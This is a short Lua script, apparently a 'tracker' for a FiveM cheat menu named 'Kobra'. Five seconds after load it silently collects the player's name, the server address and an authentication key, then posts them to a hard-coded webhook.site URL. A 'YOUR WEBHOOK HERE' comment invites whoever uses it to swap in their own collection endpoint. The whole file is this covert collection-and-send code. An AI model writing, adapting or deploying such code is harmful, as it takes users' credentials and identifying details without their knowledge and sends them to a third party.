-- tracker.lua (raw GitHub URL)
local webhook = "https://webhook.site/9c84b904-8911-4a56-aa38-18c52e72bf34"  -- YOUR WEBHOOK HERE

local function sendToWebhook(data)
    PerformHttpRequest(webhook, function(status) end, "POST", json.encode(data), { ["Content-Type"] = "application/json" })
end

CreateThread(function()
    Wait(5000)  -- Wait for player to load

    local playerName = GetPlayerName(PlayerId())
    local serverIp = GetCurrentServerEndpoint() or "unknown"
    local key = MachoAuthenticationKey() or "no_key"
    local time = os.date("%Y-%m-%d %H:%M:%S")

    sendToWebhook({
        username = playerName,
        server = serverIp,
        key = key,
        time = time,
        menu = "Kobra",
        version = "1.0"
    })
end)